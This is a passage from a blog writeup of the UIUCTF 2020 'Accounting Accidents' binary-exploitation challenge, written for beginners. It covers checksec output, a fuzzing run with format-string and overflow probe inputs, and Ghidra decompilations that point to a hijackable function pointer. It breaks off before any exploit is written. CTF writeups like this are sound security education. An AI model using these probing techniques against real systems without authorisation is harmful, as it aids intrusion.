<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> UIUCTF20 Accounting Accidents Pwn Writeup | Fan Pu Zeng </title> <meta name="author" content="Fan Pu Zeng"> <meta name="description" content="UIUCTF20 was a really fun Animal Crossing themed CTF that ran from July 17-19 2020. While I have not played the game before, I somewhat knew what it was about from watching Youtubers play it, and also from memes about the turnip stock market. Our team PPP came in third place, which went above my expectations as most people playing were relatively new and I am quite happy with the result. Now, on to the writeup! "> <meta name="keywords" content="fanpu, fan pu, fanpu zeng, fan pu zeng, zengfanpu, fanpuzeng, fzeng, CMU, cmu, carnegie mellon, cmu courses, school of computer science, scs, machine learning, computer science, ml, theory, courses, course reviews, CS, Jane Street"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img/favicon_new.ico?426605099301e95aedae716cc398b951"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://fanpu.io/blog/2020/UIUCTF20-accounting-accidents-pwn-write-up/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Fan Pu</span> Zeng </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">About </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">Blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/courses/">CMU Course Reviews </a> </li> <li class="nav-item "> <a class="nav-link" href="/cmu-online/">CMU Online </a> </li> <li class="nav-item "> <a class="nav-link" href="/summaries/">ML Paper Summaries </a> </li> <li class="nav-item "> <a class="nav-link" href="/reading-list/">ML Reading List </a> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <div style="display: none"> $$ \newcommand{\bone}{\mathbf{1}} \newcommand{\bbeta}{\mathbf{\beta}} \newcommand{\bdelta}{\mathbf{\delta}} \newcommand{\bepsilon}{\mathbf{\epsilon}} \newcommand{\blambda}{\mathbf{\lambda}} \newcommand{\bomega}{\mathbf{\omega}} \newcommand{\bpi}{\mathbf{\pi}} \newcommand{\bphi}{\mathbf{\phi}} \newcommand{\bvphi}{\mathbf{\varphi}} \newcommand{\bpsi}{\mathbf{\psi}} \newcommand{\bsigma}{\mathbf{\sigma}} \newcommand{\btheta}{\mathbf{\theta}} \newcommand{\btau}{\mathbf{\tau}} \newcommand{\ba}{\mathbf{a}} \newcommand{\bb}{\mathbf{b}} \newcommand{\bc}{\mathbf{c}} \newcommand{\bd}{\mathbf{d}} \newcommand{\be}{\mathbf{e}} \newcommand{\boldf}{\mathbf{f}} \newcommand{\bg}{\mathbf{g}} \newcommand{\bh}{\mathbf{h}} \newcommand{\bi}{\mathbf{i}} \newcommand{\bj}{\mathbf{j}} \newcommand{\bk}{\mathbf{k}} \newcommand{\bell}{\mathbf{\ell}} \newcommand{\bm}{\mathbf{m}} \newcommand{\bn}{\mathbf{n}} \newcommand{\bo}{\mathbf{o}} \newcommand{\bp}{\mathbf{p}} \newcommand{\bq}{\mathbf{q}} \newcommand{\br}{\mathbf{r}} \newcommand{\bs}{\mathbf{s}} \newcommand{\bt}{\mathbf{t}} \newcommand{\bu}{\mathbf{u}} \newcommand{\bv}{\mathbf{v}} \newcommand{\bw}{\mathbf{w}} \newcommand{\bx}{\mathbf{x}} \newcommand{\by}{\mathbf{y}} \newcommand{\bz}{\mathbf{z}} \newcommand{\bA}{\mathbf{A}} \newcommand{\bB}{\mathbf{B}} \newcommand{\bC}{\mathbf{C}} \newcommand{\bD}{\mathbf{D}} \newcommand{\bE}{\mathbf{E}} \newcommand{\bF}{\mathbf{F}} \newcommand{\bG}{\mathbf{G}} \newcommand{\bH}{\mathbf{H}} \newcommand{\bI}{\mathbf{I}} \newcommand{\bJ}{\mathbf{J}} \newcommand{\bK}{\mathbf{K}} \newcommand{\bL}{\mathbf{L}} \newcommand{\bM}{\mathbf{M}} \newcommand{\bN}{\mathbf{N}} \newcommand{\bP}{\mathbf{P}} \newcommand{\bQ}{\mathbf{Q}} \newcommand{\bR}{\mathbf{R}} \newcommand{\bS}{\mathbf{S}} \newcommand{\bT}{\mathbf{T}} \newcommand{\bU}{\mathbf{U}} \newcommand{\bV}{\mathbf{V}} \newcommand{\bW}{\mathbf{W}} \newcommand{\bX}{\mathbf{X}} \newcommand{\bY}{\mathbf{Y}} \newcommand{\bZ}{\mathbf{Z}} \newcommand{\bsa}{\boldsymbol{a}} \newcommand{\bsb}{\boldsymbol{b}} \newcommand{\bsc}{\boldsymbol{c}} \newcommand{\bsd}{\boldsymbol{d}} \newcommand{\bse}{\boldsymbol{e}} \newcommand{\bsoldf}{\boldsymbol{f}} \newcommand{\bsg}{\boldsymbol{g}} \newcommand{\bsh}{\boldsymbol{h}} \newcommand{\bsi}{\boldsymbol{i}} \newcommand{\bsj}{\boldsymbol{j}} \newcommand{\bsk}{\boldsymbol{k}} \newcommand{\bsell}{\boldsymbol{\ell}} \newcommand{\bsm}{\boldsymbol{m}} \newcommand{\bsn}{\boldsymbol{n}} \newcommand{\bso}{\boldsymbol{o}} \newcommand{\bsp}{\boldsymbol{p}} \newcommand{\bsq}{\boldsymbol{q}} \newcommand{\bsr}{\boldsymbol{r}} \newcommand{\bss}{\boldsymbol{s}} \newcommand{\bst}{\boldsymbol{t}} \newcommand{\bsu}{\boldsymbol{u}} \newcommand{\bsv}{\boldsymbol{v}} \newcommand{\bsw}{\boldsymbol{w}} \newcommand{\bsx}{\boldsymbol{x}} \newcommand{\bsy}{\boldsymbol{y}} \newcommand{\bsz}{\boldsymbol{z}} \newcommand{\bsA}{\boldsymbol{A}} \newcommand{\bsB}{\boldsymbol{B}} \newcommand{\bsC}{\boldsymbol{C}} \newcommand{\bsD}{\boldsymbol{D}} \newcommand{\bsE}{\boldsymbol{E}} \newcommand{\bsF}{\boldsymbol{F}} \newcommand{\bsG}{\boldsymbol{G}} \newcommand{\bsH}{\boldsymbol{H}} \newcommand{\bsI}{\boldsymbol{I}} \newcommand{\bsJ}{\boldsymbol{J}} \newcommand{\bsK}{\boldsymbol{K}} \newcommand{\bsL}{\boldsymbol{L}} \newcommand{\bsM}{\boldsymbol{M}} \newcommand{\bsN}{\boldsymbol{N}} \newcommand{\bsP}{\boldsymbol{P}} \newcommand{\bsQ}{\boldsymbol{Q}} \newcommand{\bsR}{\boldsymbol{R}} \newcommand{\bsS}{\boldsymbol{S}} \newcommand{\bsT}{\boldsymbol{T}} \newcommand{\bsU}{\boldsymbol{U}} \newcommand{\bsV}{\boldsymbol{V}} \newcommand{\bsW}{\boldsymbol{W}} \newcommand{\bsX}{\boldsymbol{X}} \newcommand{\bsY}{\boldsymbol{Y}} \newcommand{\bsZ}{\boldsymbol{Z}} \newcommand{\calA}{\mathcal{A}} \newcommand{\calB}{\mathcal{B}} \newcommand{\calC}{\mathcal{C}} \newcommand{\calD}{\mathcal{D}} \newcommand{\calE}{\mathcal{E}} \newcommand{\calF}{\mathcal{F}} \newcommand{\calG}{\mathcal{G}} \newcommand{\calH}{\mathcal{H}} \newcommand{\calI}{\mathcal{I}} \newcommand{\calJ}{\mathcal{J}} \newcommand{\calK}{\mathcal{K}} \newcommand{\calL}{\mathcal{L}} \newcommand{\calM}{\mathcal{M}} \newcommand{\calN}{\mathcal{N}} \newcommand{\calO}{\mathcal{O}} \newcommand{\calP}{\mathcal{P}} \newcommand{\calQ}{\mathcal{Q}} \newcommand{\calR}{\mathcal{R}} \newcommand{\calS}{\mathcal{S}} \newcommand{\calT}{\mathcal{T}} \newcommand{\calU}{\mathcal{U}} \newcommand{\calV}{\mathcal{V}} \newcommand{\calW}{\mathcal{W}} \newcommand{\calX}{\mathcal{X}} \newcommand{\calY}{\mathcal{Y}} \newcommand{\calZ}{\mathcal{Z}} \newcommand{\R}{\mathbb{R}} \newcommand{\C}{\mathbb{C}} \newcommand{\N}{\mathbb{N}} \newcommand{\Z}{\mathbb{Z}} \newcommand{\F}{\mathbb{F}} \newcommand{\Q}{\mathbb{Q}} \DeclareMathOperator*{\argmax}{arg\,max} \DeclareMathOperator*{\argmin}{arg\,min} \newcommand{\nnz}[1]{\mbox{nnz}(#1)} \newcommand{\dotprod}[2]{\langle #1, #2 \rangle} \newcommand{\ignore}[1]{} \let\Pr\relax \DeclareMathOperator*{\Pr}{\mathbf{Pr}} \newcommand{\E}{\mathbb{E}} \DeclareMathOperator*{\Ex}{\mathbf{E}} \DeclareMathOperator*{\Var}{\mathbf{Var}} \DeclareMathOperator*{\Cov}{\mathbf{Cov}} \DeclareMathOperator*{\stddev}{\mathbf{stddev}} \DeclareMathOperator*{\avg}{avg} \DeclareMathOperator{\poly}{poly} \DeclareMathOperator{\polylog}{polylog} \DeclareMathOperator{\size}{size} \DeclareMathOperator{\sgn}{sgn} \DeclareMathOperator{\dist}{dist} \DeclareMathOperator{\vol}{vol} \DeclareMathOperator{\spn}{span} \DeclareMathOperator{\supp}{supp} \DeclareMathOperator{\tr}{tr} \DeclareMathOperator{\Tr}{Tr} \DeclareMathOperator{\codim}{codim} \DeclareMathOperator{\diag}{diag} \newcommand{\PTIME}{\mathsf{P}} \newcommand{\LOGSPACE}{\mathsf{L}} \newcommand{\ZPP}{\mathsf{ZPP}} \newcommand{\RP}{\mathsf{RP}} \newcommand{\BPP}{\mathsf{BPP}} \newcommand{\P}{\mathsf{P}} \newcommand{\NP}{\mathsf{NP}} \newcommand{\TC}{\mathsf{TC}} \newcommand{\AC}{\mathsf{AC}} \newcommand{\SC}{\mathsf{SC}} \newcommand{\SZK}{\mathsf{SZK}} \newcommand{\AM}{\mathsf{AM}} \newcommand{\IP}{\mathsf{IP}} \newcommand{\PSPACE}{\mathsf{PSPACE}} \newcommand{\EXP}{\mathsf{EXP}} \newcommand{\MIP}{\mathsf{MIP}} \newcommand{\NEXP}{\mathsf{NEXP}} \newcommand{\BQP}{\mathsf{BQP}} \newcommand{\distP}{\mathsf{dist\textbf{P}}} \newcommand{\distNP}{\mathsf{dist\textbf{NP}}} \newcommand{\eps}{\epsilon} \newcommand{\lam}{\lambda} \newcommand{\dleta}{\delta} \newcommand{\simga}{\sigma} \newcommand{\vphi}{\varphi} \newcommand{\la}{\langle} \newcommand{\ra}{\rangle} \newcommand{\wt}[1]{\widetilde{#1}} \newcommand{\wh}[1]{\widehat{#1}} \newcommand{\ol}[1]{\overline{#1}} \newcommand{\ul}[1]{\underline{#1}} \newcommand{\ot}{\otimes} \newcommand{\zo}{\{0,1\}} \newcommand{\co}{:} %\newcommand{\co}{\colon} \newcommand{\bdry}{\partial} \newcommand{\grad}{\nabla} \newcommand{\transp}{^\intercal} \newcommand{\inv}{^{-1}} \newcommand{\symmdiff}{\triangle} \newcommand{\symdiff}{\symmdiff} \newcommand{\half}{\tfrac{1}{2}} \newcommand{\mathbbm}{\Bbb} \newcommand{\bbone}{\mathbbm 1} \newcommand{\Id}{\bbone} \newcommand{\SAT}{\mathsf{SAT}} \newcommand{\bcalG}{\boldsymbol{\calG}} \newcommand{\calbG}{\bcalG} \newcommand{\bcalX}{\boldsymbol{\calX}} \newcommand{\calbX}{\bcalX} \newcommand{\bcalY}{\boldsymbol{\calY}} \newcommand{\calbY}{\bcalY} \newcommand{\bcalZ}{\boldsymbol{\calZ}} \newcommand{\calbZ}{\bcalZ} $$ </div> <header class="post-header"> <h1 class="post-title">UIUCTF20 Accounting Accidents Pwn Writeup</h1> <p class="post-meta"> Created in July 21, 2020 by fanpu </p> <p class="post-tags"> <a href="/blog/2020"> <i class="fa-solid fa-calendar fa-sm"></i> 2020 </a>   ·   <a href="/blog/tag/pwn"> <i class="fa-solid fa-hashtag fa-sm"></i> pwn</a>   <a href="/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> ctf</a>   <a href="/blog/tag/code"> <i class="fa-solid fa-hashtag fa-sm"></i> code</a> </p> </header> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/posts/tallac_journey.webp-480.webp 480w, /assets/img/posts/tallac_journey.webp-800.webp 800w, /assets/img/posts/tallac_journey.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"> <img src="/assets/img/posts/tallac_journey.webp" class="preview z-depth-1 rounded center" width="100%" height="450px" alt="post.cover" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </source></picture> </figure> <div class="caption"> View on the way to the summit of Mount Tallac, Lake Tahoe, California, USA </div> <article class="post-content"> <div id="markdown-content"> <p>UIUCTF20 was a really fun Animal Crossing themed CTF that ran from July 17-19 2020. While I have not played the game before, I somewhat knew what it was about from watching Youtubers play it, and also from memes about the turnip stock market.</p> <p>Our team PPP came in third place, which went above my expectations as most people playing were relatively new and I am quite happy with the result. Now, on to the writeup!</p> <h3 id="accounting-accidents">Accounting Accidents</h3> <p>You can download the binary <a href="/assets/pwn/accounting">here</a> (sha256sum: <code class="language-plaintext highlighter-rouge">fcdc3991bed89b8aa5b509c4b6e205967a1e0b9e3fd041547492ebb75202130f</code>). This writeup is targeted at beginners to pwn, where I will explain concepts more thoroughly and avoid making leaps in logic.</p> <p>I did not look at the flavortext before solving this challenge, taking it as a hint only when I get stuck. I will take a similar approach for this writeup, where we will discover together what the binary is doing.</p> <p>Let’s first check the security attributes of the binary:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  accounting checksec accounting 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span></code></pre></figure> <p>Interesting. It’s unlikely to be a ROP challenge since there is a canary, and NX means no executing shellcode on the stack. Let’s open up the binary in Ghidra and analyse it.</p> <p>Next run file:</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  accounting file accounting 
accounting: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>72ded94a52807f73d24ae7c72db8e29099a7bfc3, not stripped</code></pre></figure> <p>Awesome, it is not stripped. This means that debugging symbols like function names are still left in the binary, which should make reversing it a little easier.</p> <h3 id="running">Running</h3> <p>When you run the binary, there is a bunch of text that is printed out character by character. Isabelle then asks us for the name of an item, and then the cost of 4 other items. Afterwards, she puts the item through her accounting software, and outputs the results. It categorizes things into left and right. No idea what that means for now.</p> <figure class="highlight"><pre><code class="language-raw" data-lang="raw">[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {0x8048878}
[NookAccounting]: Added "Apples" with cost of 10 bells to accounting spreadsheet.
[NookAccounting]: Added "Fancy Seashells" with cost of 20 bells to accounting spreadsheet.
[NookAccounting]: Added "Tom Nook Shirts" with cost of 30 bells to accounting spreadsheet.
[NookAccounting]: Added "Airplane Ticket" with cost of 40 bells to accounting spreadsheet.
[NookAccounting]: Added "ATM Repairs" with cost of 50 bells to accounting spreadsheet.
[Isabelle]: Oh no! I cant seem to find what this item is, but it cost 25 bells, what is it?
Item: %x %x %x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!
[NookAccounting]: Added "%x %x %x AAAAAA" with cost of 25 bells to accounting spreadsheet.

[Isabelle]: Ohmyheck! I dont know how much "Shrub Trimming" costs. Can you tell me?
Shrub Trimming Cost: 1
[NookAccounting]: Added "Shrub Trimming" with cost of 1 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "Raymond Hush $$" costs. Can you tell me?
Raymond Hush $$ Cost: -1
[NookAccounting]: Added "Raymond Hush $$" with cost of -1 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "Town Hall Food" costs. Can you tell me?
Town Hall Food Cost: 0
[NookAccounting]: Added "Town Hall Food" with cost of 0 bells to accounting spreadsheet.


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Ohmyheck! I dont know how much "New Wall Art" costs. Can you tell me?
New Wall Art Cost: 1


[Isabelle]: Thank you so much! You're the best, I added it to the accounting system now
[Isabelle]: Okay thank you so much! I'll run the accounting software at address 0x80487a6

===Nook(TM) Accounting Very Large Software V 10.49185.2a===
-=Left=-
Shrub Trimming: 1
Raymond Hush $$: -1
-=Right=-
Airplane Ticket: 40
ATM Repairs: 50
============================================</code></pre></figure> <p>We get a leak for the <code class="language-plaintext highlighter-rouge">.text</code> section (which is honestly pointless since there is no PIE (position independent execution)), and if we look at the source afterwards the address actually corresponds to the <code class="language-plaintext highlighter-rouge">print_flag</code> function that basically does what it says. I also tried fuzzing it with large inputs to see if it causes a segfault from buffer overflows, followed by testing “%x” inputs to check for format string vulnerabilies. These are quick and simple ways of testing for any obvious vulnerabilities before diving in to reversing. None of those worked, so let’s get to reversing!</p> <h3 id="reversing">Reversing</h3> <p>Opening the file in Ghidra, we get the following <code class="language-plaintext highlighter-rouge">main</code> function:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td> <td class="code"><pre><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">local_13c</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">local_138</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">local_12c</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">local_11c</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">local_114</span> <span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
  <span class="n">local_14</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[NookAccounting]: Booting up Fancy Laser Accounting Generator (F.L.A.G.) at {%p}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
         <span class="n">print_flag</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="s">"Apples"</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="s">"Fancy Seashells"</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="s">"Tom Nook Shirts"</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s">"Airplane Ticket"</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="s">"ATM Repairs"</span><span class="p">);</span>
  <span class="n">local_13c</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">uVar1</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="n">local_12c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Shrub Trimming"</span><span class="p">;</span>
  <span class="n">local_12c</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Raymond Hush $$"</span><span class="p">;</span>
  <span class="n">local_12c</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Town Hall Food"</span><span class="p">;</span>
  <span class="n">local_12c</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"New Wall Art"</span><span class="p">;</span>
  <span class="n">local_138</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">local_138</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">local_114</span><span class="p">,</span>
            <span class="s">"[Isabelle]: Ohmyheck! I dont know how much </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s"> costs. Can you tell me?</span><span class="se">\n</span><span class="s">%s Cost: "</span><span class="p">,</span>
            <span class="n">local_12c</span><span class="p">[</span><span class="n">local_138</span><span class="p">],</span><span class="n">local_12c</span><span class="p">[</span><span class="n">local_138</span><span class="p">]);</span>
    <span class="n">fancy_print</span><span class="p">(</span><span class="n">local_114</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">local_11c</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_11c</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_11c</span><span class="p">);</span>
    <span class="n">local_13c</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">local_13c</span><span class="p">,</span><span class="n">iVar2</span><span class="p">,</span><span class="n">local_12c</span><span class="p">[</span><span class="n">local_138</span><span class="p">]);</span>
    <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
    <span class="n">fancy_print</span><span class="p">(</span>
               <span class="s">"</span><span class="se">\n</span><span class="s">[Isabelle]: Thank you so much! You</span><span class="se">\'</span><span class="s">re the best, I added it to the accountingsystem now</span><span class="se">\n</span><span class="s">"</span>
               <span class="p">);</span>
    <span class="n">local_138</span> <span class="o">=</span> <span class="n">local_138</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">local_114</span><span class="p">,</span>
          <span class="s">"[Isabelle]: Okay thank you so much! I</span><span class="se">\'</span><span class="s">ll run the accounting software at address %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
          <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_13c</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">));</span>
  <span class="n">fancy_print</span><span class="p">(</span><span class="n">local_114</span><span class="p">);</span>
  <span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="n">local_13c</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">))(</span><span class="n">local_13c</span><span class="p">);</span>
  <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uVar1</span> <span class="o">=</span> <span class="n">__stack_chk_fail_local</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
<span class="p">}</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>The print statements pretty up matches to what we saw when running the program. We also see a <code class="language-plaintext highlighter-rouge">read</code> in line 37, but it reads in 8 bytes into a buffer of 8 bytes, so there is no overflow for this. <code class="language-plaintext highlighter-rouge">fancy_print</code> is what probably prints the buffer character-by-character, so I did not bother reversing it. I thought it was annoying at first, but then I remembered the Animal Crossing theme, so afterwards I thought it was cute.</p> <p>The most interesting part is in line 50, where we see a function pointer being called: <code class="language-plaintext highlighter-rouge">(**(code **)(local_13c + 0x20))(local_13c);</code>. <code class="language-plaintext highlighter-rouge">local_13c</code> is probably a struct of some sort, and has a function pointer at offset 0x20. It passes itself as an argument to the function.</p> <p>Let’s take a look at insert:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td> <td class="code"><pre><span class="kt">int</span> <span class="o">*</span> <span class="nf">insert</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">int</span> <span class="n">param_2</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_3</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">uVar3</span><span class="p">;</span>
  
  <span class="n">__x86</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">ax</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">==</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">param_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">newNode</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_3</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_3</span><span class="p">);</span>
      <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="p">}</span>
